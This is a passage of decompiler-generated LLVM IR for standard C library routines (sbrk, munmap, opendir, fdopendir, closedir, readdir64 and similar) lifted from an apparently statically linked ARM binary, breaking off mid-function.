dec_label_pc_152d0:                               ; preds = %entry
  %v1_152d4 = call i32 @__GI_brk(i32 0)
  %v1_152d8 = icmp slt i32 %v1_152d4, 0
  br i1 %v1_152d8, label %dec_label_pc_15304, label %dec_label_pc_152e0thread-pre-split

dec_label_pc_152e0thread-pre-split:               ; preds = %dec_label_pc_152d0
  %v0_152e4.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_152e0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_152e0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_152e0

dec_label_pc_152e0:                               ; preds = %dec_label_pc_152e0thread-pre-split, %entry
  %v1_152e0 = phi i32 [ %v1_152e0.pre, %dec_label_pc_152e0thread-pre-split ], [ 29316, %entry ]
  %v0_152e0 = phi i32 [ %v0_152e0.pre, %dec_label_pc_152e0thread-pre-split ], [ ptrtoint (i32* @global_var_268d4.582 to i32), %entry ]
  %v1_152f4 = phi i32 [ %v0_152e4.pr, %dec_label_pc_152e0thread-pre-split ], [ %arg1, %entry ]
  %v2_152e0 = add i32 %v0_152e0, %v1_152e0
  %v3_152e0 = inttoptr i32 %v2_152e0 to i32*
  %v4_152e0 = load i32, i32* %v3_152e0, align 4
  %v2_152e4 = icmp eq i32 %v1_152f4, 0
  store i32 %v4_152e0, i32* %r4.global-to-local, align 4
  br i1 %v2_152e4, label %dec_label_pc_15308, label %dec_label_pc_152f0

dec_label_pc_152f0:                               ; preds = %dec_label_pc_152e0
  %v2_152f4 = add i32 %v4_152e0, %v1_152f4
  %v1_152f8 = call i32 @__GI_brk(i32 %v2_152f4)
  %v1_152fc = icmp slt i32 %v1_152f8, 0
  br i1 %v1_152fc, label %dec_label_pc_15304, label %dec_label_pc_152f0.dec_label_pc_15308_crit_edge

dec_label_pc_152f0.dec_label_pc_15308_crit_edge:  ; preds = %dec_label_pc_152f0
  %v0_15308.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15308

dec_label_pc_15304:                               ; preds = %dec_label_pc_152f0, %dec_label_pc_152d0
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15308

dec_label_pc_15308:                               ; preds = %dec_label_pc_152e0, %dec_label_pc_152f0.dec_label_pc_15308_crit_edge, %dec_label_pc_15304
  %v0_15308 = phi i32 [ %v0_15308.pre, %dec_label_pc_152f0.dec_label_pc_15308_crit_edge ], [ -1, %dec_label_pc_15304 ], [ %v4_152e0, %dec_label_pc_152e0 ]
  %v2_1530c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1530c, i32* @r4, align 4
  ret i32 %v0_15308

; uselistorder directives
  uselistorder i32 %v4_152e0, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_15308, { 2, 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1532c = load i32, i32* @r0, align 4
  ret i32 %v1_1532c
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15330 = load i32, i32* @r7, align 4
  store i32 %v3_15330, i32* %stack_var_-8, align 4
  %v0_1533c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1533c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1533c, -4095
  br i1 %tmp, label %dec_label_pc_1535c, label %dec_label_pc_1534c

dec_label_pc_1534c:                               ; preds = %entry
  %v0_1534c = call i32 @__GI___errno_location()
  %v0_15350 = load i32, i32* %r7.global-to-local, align 4
  %v1_15350 = sub i32 0, %v0_15350
  %v2_15354 = inttoptr i32 %v0_1534c to i32*
  store i32 %v1_15350, i32* %v2_15354, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1535c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1535c

dec_label_pc_1535c:                               ; preds = %entry, %dec_label_pc_1534c
  %v1_15360 = phi i32 [ %v0_1533c, %entry ], [ -1, %dec_label_pc_1534c ]
  %v2_1535c = phi i32 [ %v3_15330, %entry ], [ %v2_1535c.pre, %dec_label_pc_1534c ]
  store i32 %v2_1535c, i32* @r7, align 4
  ret i32 %v1_15360

; uselistorder directives
  uselistorder i32 %v0_1533c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1535c, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15364 = load i32, i32* @r7, align 4
  store i32 %v3_15364, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1538c, label %dec_label_pc_1537c

dec_label_pc_1537c:                               ; preds = %entry
  %v0_1537c = call i32 @__GI___errno_location()
  %v0_15380 = load i32, i32* %r7.global-to-local, align 4
  %v1_15380 = sub i32 0, %v0_15380
  %v2_15384 = inttoptr i32 %v0_1537c to i32*
  store i32 %v1_15380, i32* %v2_15384, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15390.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1538c

dec_label_pc_1538c:                               ; preds = %entry, %dec_label_pc_1537c
  %v2_15390 = phi i32 [ %v3_15364, %entry ], [ %v2_15390.pre, %dec_label_pc_1537c ]
  %v0_1538c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1537c ]
  store i32 %v2_15390, i32* @r7, align 4
  ret i32 %v0_1538c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1538c, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_153cc, label %dec_label_pc_153bc

dec_label_pc_153bc:                               ; preds = %entry
  %v0_153bc = call i32 @__GI___errno_location()
  %v0_153c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_153c0 = sub i32 0, %v0_153c0
  %v2_153c4 = inttoptr i32 %v0_153bc to i32*
  store i32 %v1_153c0, i32* %v2_153c4, align 4
  br label %dec_label_pc_153cc

dec_label_pc_153cc:                               ; preds = %entry, %dec_label_pc_153bc
  %v1_153d4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_153bc ]
  ret i32 %v1_153d4

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_153cc, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_153d8 = load i32, i32* @r7, align 4
  store i32 %v3_153d8, i32* %stack_var_-8, align 4
  %v0_153e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_153e4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_153e4, -4095
  br i1 %tmp, label %dec_label_pc_15404, label %dec_label_pc_153f4

dec_label_pc_153f4:                               ; preds = %entry
  %v0_153f4 = call i32 @__GI___errno_location()
  %v0_153f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_153f8 = sub i32 0, %v0_153f8
  %v2_153fc = inttoptr i32 %v0_153f4 to i32*
  store i32 %v1_153f8, i32* %v2_153fc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15404.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15404

dec_label_pc_15404:                               ; preds = %entry, %dec_label_pc_153f4
  %v1_15408 = phi i32 [ %v0_153e4, %entry ], [ -1, %dec_label_pc_153f4 ]
  %v2_15404 = phi i32 [ %v3_153d8, %entry ], [ %v2_15404.pre, %dec_label_pc_153f4 ]
  store i32 %v2_15404, i32* @r7, align 4
  ret i32 %v1_15408

; uselistorder directives
  uselistorder i32 %v0_153e4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15404, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1540c = load i32, i32* @r4, align 4
  store i32 %v3_1540c, i32* %stack_var_-24, align 4
  %v2_15410 = load i32, i32* %arg1, align 4
  store i32 %v2_15410, i32* %r4.global-to-local, align 4
  %v3_15418 = icmp eq i32 %v2_15410, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r6, align 4
  br i1 %v3_15418, label %dec_label_pc_1542c, label %dec_label_pc_15440

dec_label_pc_1542c:                               ; preds = %entry
  %v0_1542c = call i32 @__GI___errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_15434 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15434, i32* %r2.global-to-local, align 4
  %v2_15438 = inttoptr i32 %v0_1542c to i32*
  store i32 9, i32* %v2_15438, align 4
  %v0_154e0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_154e0

dec_label_pc_15440:                               ; preds = %entry
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_15444 = add i32 %tmp, 24
  store i32 %v1_15444, i32* %r4.global-to-local, align 4
  store i32 %v1_15444, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_15458 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_15458)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_15470 = load i32, i32* @r6, align 4
  %v2_15470 = add i32 %v0_15470, 16
  %v3_15470 = inttoptr i32 %v2_15470 to i32*
  %v4_15470 = load i32, i32* %v3_15470, align 4
  call void @__pseudo_branch(i32 %v4_15470)
  %v0_1547c = load i32, i32* @r7, align 4
  %v1_1547c = inttoptr i32 %v0_1547c to i32*
  %v2_1547c = load i32, i32* %v1_1547c, align 4
  store i32 %v2_1547c, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_1548c = load i32, i32* @r8, align 4
  store i32 %v0_1548c, i32* %v1_1547c, align 4
  %v0_15490 = load i32, i32* @r6, align 4
  %v1_15490 = load i32, i32* %r3.global-to-local, align 4
  %v2_15490 = add i32 %v1_15490, %v0_15490
  %v3_15490 = inttoptr i32 %v2_15490 to i32*
  %v4_15490 = load i32, i32* %v3_15490, align 4
  store i32 ptrtoint (i32* @global_var_1549c.863 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15490)
  %v0_1549c = load i32, i32* @r7, align 4
  %v1_1549c = add i32 %v0_1549c, 12
  %v2_1549c = inttoptr i32 %v1_1549c to i32*
  %v3_1549c = load i32, i32* %v2_1549c, align 4
  store i32 %v3_1549c, i32* @r0, align 4
  %v0_154a0 = call i32 @free()
  %v0_154a4 = load i32, i32* @r7, align 4
  store i32 %v0_154a4, i32* @r0, align 4
  %v0_154a8 = call i32 @free()
  %v0_154b0 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_154b0, -4095
  br i1 %tmp11, label %dec_label_pc_154dc, label %dec_label_pc_154cc

dec_label_pc_154cc:                               ; preds = %dec_label_pc_15440
  %v0_154cc = call i32 @__GI___errno_location()
  %v0_154d0 = load i32, i32* @r4, align 4
  %v1_154d0 = sub i32 0, %v0_154d0
  store i32 %v1_154d0, i32* %r3.global-to-local, align 4
  %v2_154d4 = inttoptr i32 %v0_154cc to i32*
  store i32 %v1_154d0, i32* %v2_154d4, align 4
  %v0_154d8 = load i32, i32* @r8, align 4
  br label %dec_label_pc_154dc

dec_label_pc_154dc:                               ; preds = %dec_label_pc_15440, %dec_label_pc_154cc
  %v0_154dc = phi i32 [ %v0_154b0, %dec_label_pc_15440 ], [ %v0_154d8, %dec_label_pc_154cc ]
  store i32 %v0_154dc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_154e0

dec_label_pc_154e0:                               ; preds = %dec_label_pc_1542c, %dec_label_pc_154dc
  %v0_154e0 = phi i32 [ %v0_154e0.pre, %dec_label_pc_1542c ], [ %v0_154dc, %dec_label_pc_154dc ]
  %v2_154e8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_154e8, i32* %r4.global-to-local, align 4
  ret i32 %v0_154e0

; uselistorder directives
  uselistorder i32 %v0_154b0, { 1, 0 }
  uselistorder label %dec_label_pc_154e0, { 1, 0 }
  uselistorder label %dec_label_pc_154dc, { 1, 0 }
}

define i32 @function_154f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_154f4:
  %v0_154f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_154f4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_154f4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_154f4, %bb
  %v10_15500 = phi i32 [ %arg1, %dec_label_pc_154f4 ], [ 0, %bb ]
  ret i32 %v10_15500

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_15504 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_15518 = call i32 @malloc(i32 48)
  %v2_15520 = icmp eq i32 %v1_15518, 0
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r6, align 4
  br i1 %v2_15520, label %bb, label %dec_label_pc_15530

bb:                                               ; preds = %entry
  br label %dec_label_pc_155bc

dec_label_pc_15530:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15534 = load i32, i32* @r4, align 4
  %v2_15534 = icmp ugt i32 %v0_15534, 511
  %v2_15538 = add i32 %v1_15518, 4
  %v3_15538 = inttoptr i32 %v2_15538 to i32*
  store i32 0, i32* %v3_15538, align 4
  %v0_1553c = load i32, i32* %r3.global-to-local, align 4
  %v2_1553c = add i32 %v1_15518, 16
  %v3_1553c = inttoptr i32 %v2_1553c to i32*
  store i32 %v0_1553c, i32* %v3_1553c, align 4
  %v0_15540 = load i32, i32* %r3.global-to-local, align 4
  %v2_15540 = add i32 %v1_15518, 8
  %v3_15540 = inttoptr i32 %v2_15540 to i32*
  store i32 %v0_15540, i32* %v3_15540, align 4
  br i1 %v2_15534, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_15530
  %v0_155482 = load i32, i32* @r4, align 4
  %v2_155483 = add i32 %v1_15518, 20
  %v3_155484 = inttoptr i32 %v2_155483 to i32*
  store i32 %v0_155482, i32* %v3_155484, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_15530
  %v1_15544 = load i32, i32* %r3.global-to-local, align 4
  %v2_15544 = add i32 %v1_15544, 512
  store i32 %v2_15544, i32* %r3.global-to-local, align 4
  %v0_15548 = load i32, i32* @r4, align 4
  %v2_15548 = add i32 %v1_15518, 20
  %v3_15548 = inttoptr i32 %v2_15548 to i32*
  store i32 %v0_15548, i32* %v3_15548, align 4
  %v1_1554c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1554c, i32* %v3_15548, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_15518, i32* @r5, align 4
  %v0_15554 = load i32, i32* @r7, align 4
  %v2_15554 = inttoptr i32 %v1_15518 to i32*
  store i32 %v0_15554, i32* %v2_15554, align 4
  %v0_15558 = load i32, i32* @r5, align 4
  %v1_15558 = add i32 %v0_15558, 20
  %v2_15558 = inttoptr i32 %v1_15558 to i32*
  %v3_15558 = load i32, i32* %v2_15558, align 4
  store i32 %v3_15558, i32* %r1.global-to-local, align 4
  %v2_15560 = call i32 @calloc(i32 1, i32 %v3_15558)
  %v2_15564 = icmp eq i32 %v2_15560, 0
  store i32 %v2_15560, i32* @r4, align 4
  %v1_1556c = load i32, i32* @r5, align 4
  %v2_1556c = add i32 %v1_1556c, 12
  %v3_1556c = inttoptr i32 %v2_1556c to i32*
  store i32 %v2_15560, i32* %v3_1556c, align 4
  br i1 %v2_15564, label %dec_label_pc_15574, label %dec_label_pc_15584

dec_label_pc_15574:                               ; preds = %bb17
  %v0_15574 = load i32, i32* @r5, align 4
  store i32 %v0_15574, i32* @r0, align 4
  %v0_15578 = call i32 @free()
  %v0_1557c = load i32, i32* @r4, align 4
  br label %dec_label_pc_155bc

dec_label_pc_15584:                               ; preds = %bb17
  %v0_15588 = load i32, i32* @r6, align 4
  %v2_15588 = add i32 %v0_15588, -33076
  store i32 %v2_15588, i32* %r3.global-to-local, align 4
  %v1_15590 = inttoptr i32 %v2_15588 to i32*
  %v2_15590 = load i32, i32* %v1_15590, align 4
  %v3_15590 = add i32 %v0_15588, -33072
  %v4_15590 = inttoptr i32 %v3_15590 to i32*
  %v5_15590 = load i32, i32* %v4_15590, align 4
  store i32 %v5_15590, i32* %r1.global-to-local, align 4
  %v6_15590 = add i32 %v0_15588, -33068
  %v7_15590 = inttoptr i32 %v6_15590 to i32*
  %v8_15590 = load i32, i32* %v7_15590, align 4
  store i32 %v8_15590, i32* %r2.global-to-local, align 4
  %v9_15590 = add i32 %v0_15588, -33064
  %v10_15590 = inttoptr i32 %v9_15590 to i32*
  %v11_15590 = load i32, i32* %v10_15590, align 4
  store i32 %v11_15590, i32* %r3.global-to-local, align 4
  %v12_15590 = add i32 %v0_15588, -33060
  %v1_1559c = inttoptr i32 %v12_15590 to i32*
  %v2_1559c = load i32, i32* %v1_1559c, align 4
  %v3_1559c = add i32 %v0_15588, -33056
  %v4_1559c = inttoptr i32 %v3_1559c to i32*
  %v5_1559c = load i32, i32* %v4_1559c, align 4
  store i32 %v2_1559c, i32* %stack_var_-32, align 4
  store i32 %v5_15590, i32* %r1.global-to-local, align 4
  store i32 %v8_15590, i32* %r2.global-to-local, align 4
  store i32 %v11_15590, i32* %r3.global-to-local, align 4
  %v0_155ac = load i32, i32* @r5, align 4
  %v1_155ac = add i32 %v0_155ac, 24
  %v1_155b0 = inttoptr i32 %v1_155ac to i32*
  store i32 %v2_15590, i32* %v1_155b0, align 4
  %v3_155b0 = add i32 %v0_155ac, 28
  %v4_155b0 = inttoptr i32 %v3_155b0 to i32*
  %v5_155b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_155b0, i32* %v4_155b0, align 4
  %v6_155b0 = add i32 %v0_155ac, 32
  %v7_155b0 = inttoptr i32 %v6_155b0 to i32*
  %v8_155b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_155b0, i32* %v7_155b0, align 4
  %v9_155b0 = add i32 %v0_155ac, 36
  %v10_155b0 = inttoptr i32 %v9_155b0 to i32*
  %v11_155b0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_155b0, i32* %v10_155b0, align 4
  %v12_155b0 = add i32 %v0_155ac, 40
  %v2_155b4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_1559c, i32* %r1.global-to-local, align 4
  %v1_155b8 = inttoptr i32 %v12_155b0 to i32*
  store i32 %v2_155b4, i32* %v1_155b8, align 4
  %v3_155b8 = add i32 %v0_155ac, 44
  %v4_155b8 = inttoptr i32 %v3_155b8 to i32*
  %v5_155b8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_155b8, i32* %v4_155b8, align 4
  %v0_155bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_155bc

dec_label_pc_155bc:                               ; preds = %bb, %dec_label_pc_15574, %dec_label_pc_15584
  %v0_155bc = phi i32 [ 0, %bb ], [ %v0_1557c, %dec_label_pc_15574 ], [ %v0_155bc.pre, %dec_label_pc_15584 ]
  store i32 %v12_15504, i32* @r7, align 4
  ret i32 %v0_155bc

; uselistorder directives
  uselistorder i32 %v2_15560, { 1, 0, 2 }
  uselistorder i32 %v1_15518, { 2, 1, 4, 0, 6, 5, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_155bc, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_155dc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_15604, label %dec_label_pc_155f4

dec_label_pc_155f4:                               ; preds = %entry
  %v0_155f4 = call i32 @__GI___errno_location()
  %v0_155f8 = load i32, i32* @r7, align 4
  %v1_155f8 = sub i32 0, %v0_155f8
  %v2_155fc = inttoptr i32 %v0_155f4 to i32*
  store i32 %v1_155f8, i32* %v2_155fc, align 4
  br label %dec_label_pc_15628

dec_label_pc_15604:                               ; preds = %entry
  %v1_15604 = icmp slt i32 %arg1, 0
  br i1 %v1_15604, label %dec_label_pc_15628, label %dec_label_pc_1560c

dec_label_pc_1560c:                               ; preds = %dec_label_pc_15604
  store i32 %v2_155dc, i32* @r1, align 4
  %v0_15610 = call i32 @fstat()
  %v1_15614 = icmp slt i32 %v0_15610, 0
  br i1 %v1_15614, label %dec_label_pc_1561c, label %dec_label_pc_15630

dec_label_pc_1561c:                               ; preds = %dec_label_pc_1560c
  br label %dec_label_pc_15628

dec_label_pc_15628:                               ; preds = %dec_label_pc_1561c, %dec_label_pc_15604, %dec_label_pc_155f4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1566c

dec_label_pc_15630:                               ; preds = %dec_label_pc_1560c
  %v0_15638 = load i32, i32* @r7, align 4
  %v3_1563c = call i32 @__GI___fcntl_nocancel(i32 %v0_15638, i32 2, i32 1)
  %v0_15640 = load i32, i32* @r7, align 4
  %v2_15648 = call i32 @fd_to_DIR(i32 %v0_15640, i32 %tmp)
  store i32 %v2_15648, i32* %r4.global-to-local, align 4
  %v2_1564c = icmp eq i32 %v2_15648, 0
  br i1 %v2_1564c, label %dec_label_pc_15654, label %dec_label_pc_1566c

dec_label_pc_15654:                               ; preds = %dec_label_pc_15630
  %v0_15660 = call i32 @__GI___errno_location()
  %v2_15668 = inttoptr i32 %v0_15660 to i32*
  store i32 12, i32* %v2_15668, align 4
  %v0_1566c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1566c

dec_label_pc_1566c:                               ; preds = %dec_label_pc_15630, %dec_label_pc_15628, %dec_label_pc_15654
  %v0_1566c = phi i32 [ %v2_15648, %dec_label_pc_15630 ], [ 0, %dec_label_pc_15628 ], [ %v0_1566c.pre, %dec_label_pc_15654 ]
  ret i32 %v0_1566c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1566c, { 2, 0, 1 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_15684 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_15684, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15690 = call i32 @fstat()
  store i32 %v0_15690, i32* @r5, align 4
  %v2_15694 = icmp eq i32 %v0_15690, 0
  br i1 %v2_15694, label %dec_label_pc_1569c, label %dec_label_pc_15704

dec_label_pc_1569c:                               ; preds = %entry
  %v1_156a0 = and i32 %tmp4, 61440
  store i32 %v1_156a0, i32* @r3, align 4
  %v7_156a4 = icmp eq i32 %v1_156a0, 16384
  br i1 %v7_156a4, label %dec_label_pc_156bc, label %dec_label_pc_156ac

dec_label_pc_156ac:                               ; preds = %dec_label_pc_1569c
  %v0_156ac = call i32 @__GI___errno_location()
  br label %dec_label_pc_156e8

dec_label_pc_156bc:                               ; preds = %dec_label_pc_1569c
  %v0_156bc = load i32, i32* @r4, align 4
  %v2_156c4 = call i32 @__libc_fcntl(i32 %v0_156bc, i32 3)
  %v7_156c8 = icmp eq i32 %v2_156c4, -1
  br i1 %v7_156c8, label %dec_label_pc_15704, label %dec_label_pc_156d0

dec_label_pc_156d0:                               ; preds = %dec_label_pc_156bc
  %v1_156d0 = urem i32 %v2_156c4, 4
  %v7_156d4 = icmp eq i32 %v1_156d0, 1
  br i1 %v7_156d4, label %dec_label_pc_156dc, label %dec_label_pc_156f0

dec_label_pc_156dc:                               ; preds = %dec_label_pc_156d0
  %v0_156dc = call i32 @__GI___errno_location()
  br label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_156ac, %dec_label_pc_156dc
  %storemerge2 = phi i32 [ %v0_156ac, %dec_label_pc_156ac ], [ %v0_156dc, %dec_label_pc_156dc ]
  %storemerge = phi i32 [ 20, %dec_label_pc_156ac ], [ 22, %dec_label_pc_156dc ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_156e8 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_156e8, align 4
  %v0_15708.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15708

dec_label_pc_156f0:                               ; preds = %dec_label_pc_156d0
  %v0_156f0 = load i32, i32* @r4, align 4
  %v2_156f8 = call i32 @fd_to_DIR(i32 %v0_156f0, i32 %tmp)
  store i32 %v2_156f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15708

dec_label_pc_15704:                               ; preds = %entry, %dec_label_pc_156bc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15708

dec_label_pc_15708:                               ; preds = %dec_label_pc_156f0, %dec_label_pc_156e8, %dec_label_pc_15704
  %v0_15708 = phi i32 [ %v2_156f8, %dec_label_pc_156f0 ], [ %v0_15708.pre, %dec_label_pc_156e8 ], [ 0, %dec_label_pc_15704 ]
  ret i32 %v0_15708

; uselistorder directives
  uselistorder i32 %v2_156c4, { 1, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 10, 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 16384, { 12, 0, 13, 5, 6, 7, 3, 4, 1, 2, 8, 9, 10, 11 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_15708, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15704, { 1, 0 }
  uselistorder label %dec_label_pc_156e8, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r6, align 4
  %v1_1572c = add i32 %tmp, 24
  store i32 %v1_1572c, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_15744 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  store i32 %v4_15744, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15744)
  %v0_15758 = load i32, i32* @r6, align 4
  %v2_15758 = add i32 %v0_15758, 16
  %v3_15758 = inttoptr i32 %v2_15758 to i32*
  %v4_15758 = load i32, i32* %v3_15758, align 4
  store i32 %v4_15758, i32* %ip.global-to-local, align 4
  store i32 87908, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15758)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_15768

dec_label_pc_15768:                               ; preds = %dec_label_pc_15798, %entry
  %v0_15768 = load i32, i32* @r5, align 4
  %v1_15768 = add i32 %v0_15768, 4
  %v2_15768 = inttoptr i32 %v1_15768 to i32*
  %v3_15768 = load i32, i32* %v2_15768, align 4
  %v4_15768 = add i32 %v0_15768, 8
  %v5_15768 = inttoptr i32 %v4_15768 to i32*
  %v6_15768 = load i32, i32* %v5_15768, align 4
  %tmp10 = icmp ugt i32 %v6_15768, %v3_15768
  br i1 %tmp10, label %dec_label_pc_15798, label %dec_label_pc_15774

dec_label_pc_15774:                               ; preds = %dec_label_pc_15768
  %v1_15774 = inttoptr i32 %v0_15768 to i32*
  %v2_15774 = load i32, i32* %v1_15774, align 4
  %v1_15778 = add i32 %v0_15768, 12
  %v2_15778 = inttoptr i32 %v1_15778 to i32*
  %v3_15778 = load i32, i32* %v2_15778, align 4
  %v1_1577c = add i32 %v0_15768, 20
  %v2_1577c = inttoptr i32 %v1_1577c to i32*
